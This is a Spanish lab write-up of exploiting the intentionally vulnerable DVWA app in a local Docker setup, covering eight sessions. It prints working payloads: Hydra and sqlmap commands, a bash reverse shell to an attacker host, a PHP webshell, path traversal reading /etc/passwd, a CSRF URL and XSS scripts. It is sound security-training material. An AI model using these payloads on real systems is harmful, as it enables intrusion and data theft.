# Laboratorio DVWA - Persistencia y Prácticas

## 1. Descripción del Entorno

Se ha configurado un entorno con **DVWA (Damn Vulnerable Web App)** utilizando Docker Compose. La modificación principal respecto al archivo original es la adición de **persistencia en la base de datos**.

*   **URL de Acceso:** `http://localhost:8081`
*   **Credenciales por defecto:** `admin` / `password`

## 2. Configuración Técnica

Para solucionar el problema de reinicio de la base de datos, se ha modificado el archivo `docker-compose.yml` añadiendo un volumen Docker local.

### Cambios realizados en `docker-compose.yml`

```yaml
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa-target
    ports:
      - "8081:80"
    volumes:
      - dvwa-data:/var/lib/mysql  # <--- Persistencia añadida
    networks:
      - pentesting_net

volumes:
  dvwa-data: # Volumen local gestionado por Docker
```

## 3. Inicialización (Importante)

1.  La primera vez que accedas, serás redirigido a `/setup.php`.
2.  Si ves errores en rojo (System Check), baja al final de la página.
3.  Haz clic en el botón **"Create / Reset Database"**.
4.  Deberías ver confirmaciones de creación de tablas y ser redirigido al login.
5.  Gracias al volumen `dvwa-data`, **esta configuración persistirá** incluso si reinicias el contenedor (`docker compose down` / `up`).

## 4. Registro de Prácticas

### Sesión 1: Brute Force (Fuerza Bruta)
*   **Objetivo:** Obtener las credenciales del usuario `admin`.
*   **Herramienta:** Hydra (desde contenedor `kali-attacker`).
*   **Comando Exitoso:**
    ```bash
    # Nota: Requiere obtener PHPSESSID del navegador
    # Sintaxis: URL : Parametros : Opcionales(Headers con dos puntos escapados) : CondicionFallo
    hydra -L /tmp/users.txt -P /tmp/pass.txt -s 80 dvwa-target http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=TU_COOKIE_AQUI:F=incorrect"
    ```
*   **Resultados:**
    *   `[80][http-get-form] host: dvwa-target   login: admin   password: password`

### Sesión 2: Command Injection
*   **Objetivo:** Ejecutar comandos arbitrarios y obtener Acceso Remoto (Reverse Shell).
*   **Prueba Inicial:** Payload `127.0.0.1; ls -la` -> Éxito (Listado de archivos).
*   **Reverse Shell (Acceso Total):**
    1.  **Listener en Kali:** `nc -lvvp 4444`
    2.  **Payload (Bash Redirect):**
        ```bash
        127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/kali-attacker/4444 0>&1'
        ```
    3.  **Resultado:** Conexión estblecida como usuario `www-data`.

### Sesión 3: SQL Injection (SQLi)
*   **Objetivo:** Extraer la base de datos de usuarios.
*   **Prueba Manual:** `1'` -> Error de sintaxis SQL (Indica vulnerabilidad).
*   **Explotación con SQLMap:**
    ```bash
    sqlmap -u "http://dvwa-target/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=TU_COOKIE_AQUI" -D dvwa -T users --dump --batch
    ```
*   **Hallazgos:**
    *   Se extrajeron 5 cuentas de usuario.
    *   `admin` -> `password` (o `pwned` si ya hiciste CSRF).

### Sesión 4: CSRF (Cross-Site Request Forgery)
*   **Objetivo:** Cambiar la contraseña del administrador sin su consentimiento explícito.
*   **Vuln:** La petición de cambio de password se hace vía GET y no requiere confirmación ni token anti-CSRF.
*   **Exploit URL:**
    ```
    http://localhost:8081/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change
    ```
*   **Resultado:** Al visitar la URL con la sesión iniciada, la contraseña cambia automáticamente a `pwned`.

### Sesión 5: File Inclusion
*   **Tipo:** LFI (Local File Inclusion).
*   **Exploit:** Uso de *Path Traversal* (`../`) para leer archivos del sistema.
*   **Payload:**
    ```
    http://localhost:8081/vulnerabilities/fi/?page=../../../../../../etc/passwd
    ```
*   **Resultado:** Se visualiza el contenido de `/etc/passwd`.
*   **RFI Check:** `page=http://google.com` -> **Fallido**. El servidor tiene `allow_url_include = Off` (Seguro).

### Sesión 6: File Upload
*   **Objetivo:** Subir un archivo PHP malicioso (Webshell) para ejecutar comandos.
*   **Método:** Subida directa de archivo `.php` (sin validación de tipo de archivo en nivel Low).
*   **Webshell utilizada:**
    ```php
    <?php system($_REQUEST['cmd']); ?>
    ```
*   **Ejecución:**
    `http://localhost:8081/hackable/uploads/simple-backdoor.php?cmd=ls -la`
*   **Resultado:** Ejecución remota de comandos (RCE) confirmada.

### Sesión 7: XSS (Cross Site Scripting)
*   **Tipo: Reflected.**
    *   **Payload:** `<script>alert('HACKED')</script>`
    *   **Resultado:** Pop-up inmediato al enviar el formulario. No persistente.
*   **Tipo: Stored (Almacenado).**
    *   **Contexto:** Guestbook (Libro de visitas).
    *   **Payload:** `<script>alert('INFECTADO')</script>` en el campo *Message*.
    *   **Resultado:** El script se guarda en la base de datos MySQL.
    *   **Impacto:** Cada vez que *cualquier* usuario visita la página del Guestbook, el script malicioso se ejecuta automáticamente. Persistencia lograda.

### Sesión 8: Brute Force (Level Medium)
*   **Diferencia clave:** El código fuente aplica `mysql_real_escape_string()`, lo que impide el bypass por SQL Injection (ej. `admin' #`).
*   **Estrategia:** Atacar la debilidad de la contraseña, ya que no hay mecanismos de bloqueo (Account Lockout) ni retardos artificiales.
*   **Comando Exitoso (Hydra):**
    ```bash
    # Se ajusta la cookie security=medium
    hydra -L /tmp/users.txt -P /tmp/pass.txt -s 80 dvwa-target http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=medium; PHPSESSID=TU_COOKIE_AQUI:F=incorrect"
    ```
*   **Resultado:**
    *   `[80][http-get-form] host: dvwa-target   login: admin   password: pwned`
*   **Lección:** Sanitizar la entrada (input sanitization) protege contra inyecciones, pero no suple la falta de políticas de contraseñas robustas o limitación de intentos (Rate Limiting).

## 5. Conclusión y Lecciones Aprendidas

En esta sesión intensiva se ha asegurado la persistencia del laboratorio DVWA y se han explotado las principales vulnerabilidades OWASP Top 10 en nivel bajo:

1.  **Broken Authentication:** Contraseñas débiles permiten ataques de fuerza bruta (Hydra).
2.  **Injection:** Tanto de comandos (RCE) como SQL (SQLi), permitiendo control total y robo de datos.
3.  **Broken Access Control:** CSRF permite acciones no autorizadas si no hay tokens de protección.
4.  **Security Misconfiguration:** Subida de archivos sin validar y permisos de inclusión (LFI) exponen el servidor.
5.  **XSS:** La falta de sanitización de entrada permite ejecutar código en los navegadores de los usuarios, siendo la variante *Stored* la más peligrosa por su persistencia.

**Estado del Laboratorio:** 🟢 Operativo y Persistente.
